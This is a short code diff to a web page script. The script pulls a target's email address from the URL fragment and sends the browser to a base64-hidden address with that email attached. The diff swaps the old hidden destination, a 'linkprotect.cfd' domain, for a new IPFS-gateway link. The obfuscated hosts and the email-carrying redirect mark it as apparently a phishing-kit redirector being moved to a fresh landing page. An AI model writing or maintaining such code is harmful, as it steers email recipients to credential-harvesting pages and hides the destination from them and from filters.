@@ -10,7 +10,8 @@
       var dom= queryString.split("#");
       var email = dom[1];
       var decodedMail= atob(email);
-      const forwardUrl = atob("aHR0cHM6Ly9zZWN1cmVzZXJ2ZXIubGlua3Byb3RlY3QuY2ZkL2VUVVpzYWZKIw==");
+     // const forwardUrl = atob("aHR0cHM6Ly9zZWN1cmVzZXJ2ZXIubGlua3Byb3RlY3QuY2ZkL2VUVVpzYWZKIw==");
+      const forwardUrl = atob("aHR0cHM6Ly9iYWZrcmVpZ3RqbDZwNWdicnc2ZGd3Mjd5dDR6ZnhhNmF0Y212d3J2bmtxNjJ3YzU3aWZkcmJpZ3BncS5pcGZzLmNmLWlwZnMuY29tP1JBbExTTlBJSVc5NTVMQWFBMUdpUmRUN3pxNExPNWticDlnVmdvNGJXRnp6VkdWRkRMalI2NThUVjljbHZoZUpUY1B5VS13VjRvTlB6SHZFOUZtNk1sRC15OUlVSlV1aHk3aUNIaHZOS1N6bjc3REdueHpWbGZsQ1Aza2Yj");
       window.location.href = forwardUrl + decodedMail;
     }
   </script>
